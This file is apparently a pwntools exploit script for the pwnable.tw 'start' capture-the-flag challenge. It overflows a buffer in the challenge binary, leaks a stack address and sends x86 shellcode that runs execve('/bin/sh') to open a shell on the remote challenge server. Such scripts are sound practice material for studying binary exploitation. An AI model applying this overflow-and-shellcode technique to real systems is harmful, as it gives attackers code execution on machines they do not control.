from pwn import *
DEBUG = 0
context(arch = 'i386', os = 'linux', log_level = 'debug')
if DEBUG:
    p = process('./start.dms')
    gdb.attach(p)
else:
    p = remote('chall.pwnable.tw', 10000)
p.send('a' * 0x14 + p32(0x08048087))
p.recvuntil('CTF:')
ESP = u32(p.recv(4)) + 0x14
payload = 'a' * 0x14 + p32(ESP) + asm('mov eax, 0x0b;mov ebx, %d; mov ecx, 0; mov edx, 0; int 0x80' % (ESP + 24))
payload = payload.ljust(0x30, 'a') + '/bin/sh\x00'
p.send(payload)
p.interactive()
